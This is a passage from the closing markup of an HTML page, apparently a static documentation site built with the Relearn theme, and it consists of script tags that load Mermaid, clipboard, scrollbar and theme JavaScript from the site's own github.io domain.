src=https://irfan123456789-hub.github.io/js/mermaid/mermaid.min.js?1762045851 defer></script><script>window.relearn.themeUseMermaid=JSON.parse("{}")</script><script src=https://irfan123456789-hub.github.io/js/clipboard/clipboard.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/perfect-scrollbar/perfect-scrollbar.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/theme.min.js?1762045851 defer></script></body></html>